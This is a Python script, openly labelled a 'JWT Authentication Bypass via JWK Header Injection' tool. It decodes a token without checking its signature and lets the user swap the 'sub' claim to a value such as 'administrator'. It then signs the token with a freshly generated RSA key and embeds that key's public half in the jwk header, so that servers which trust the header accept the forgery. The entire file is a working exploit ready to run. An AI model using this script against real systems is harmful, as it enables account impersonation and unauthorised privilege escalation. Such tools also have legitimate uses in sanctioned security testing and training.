import jwt
import base64
import argparse
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

# Step 1: Parse the command-line argument for the JWT token
def parse_arguments():
    parser = argparse.ArgumentParser(description="JWT Authentication Bypass via JWK Header Injection")
    parser.add_argument("token", help="JWT token to manipulate")
    return parser.parse_args()

# Step 2: Decode the JWT and verify signature
def decode_jwt(token):
    decoded_token = jwt.decode(token, options={"verify_signature": False})
    decoded_header = jwt.get_unverified_header(token)
    print(f"Decoded token: {decoded_token}")
    print(f"Decoded header: {decoded_header}\n")
    return decoded_token, decoded_header

# Step 3: Ask the user to modify the payload
def modify_payload(decoded_token):
    print(f"Current payload: {decoded_token}")
    modify = input("Would you like to modify the payload? (yes/no): ").strip().lower()
    
    if modify == 'yes':
        sub = input("Enter the new value for 'sub' claim (e.g., 'administrator'): ").strip()
        decoded_token['sub'] = sub
        print(f"Modified payload: {decoded_token}")
    return decoded_token

# Step 4: Generate RSA keys (private and public) if they do not exist
def generate_rsa_keys():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    public_key = private_key.public_key()
    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    # Save the keys to files
    with open('private_key.pem', 'wb') as priv_file:
        priv_file.write(private_pem)

    with open('public_key.pem', 'wb') as pub_file:
        pub_file.write(public_pem)

    print("RSA private and public keys have been generated and saved as 'private_key.pem' and 'public_key.pem'.")
    
    return private_key, public_key

# Step 5: Generate the JWK from private key
def generate_jwk_from_private_key(private_key, decoded_header):
    public_key = private_key.public_key()
    public_numbers = public_key.public_numbers()
    jwk = {
        "kty": "RSA",
        "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8'),
        "kid": decoded_header['kid'],
        "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
    }
    return jwk

# Step 6: Sign the modified JWT using the RSA private key and JWK header
def sign_modified_jwt(decoded_token, private_key, jwk, decoded_header):
    modified_token = jwt.encode(decoded_token, private_key, algorithm='RS256', headers={'jwk': jwk, 'kid': decoded_header['kid']})
    return modified_token

# Main function
def main():
    # Parse the command-line argument for the JWT token
    args = parse_arguments()
    token = args.token

    # Step 2: Decode the JWT
    decoded_token, decoded_header = decode_jwt(token)

    # Step 3: Modify the payload
    modified_payload = modify_payload(decoded_token)

    # Step 4: Generate RSA keys if they do not exist
    try:
        with open('private_key.pem', 'rb') as f:
            private_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())
        with open('public_key.pem', 'rb') as f:
            public_key = serialization.load_pem_public_key(f.read(), backend=default_backend())
    except FileNotFoundError:
        print("Private or public key not found. Generating new RSA keys...")
        private_key, public_key = generate_rsa_keys()

    # Generate the JWK from the private key
    jwk = generate_jwk_from_private_key(private_key, decoded_header)

    # Step 6: Generate the modified token
    modified_token = sign_modified_jwt(modified_payload, private_key, jwk, decoded_header)

    # Print the modified header
    print(f"Modified header: {jwt.get_unverified_header(modified_token)}\n")

    # Print the final modified token
    print("Final Token: " + modified_token)

if __name__ == "__main__":
    main()
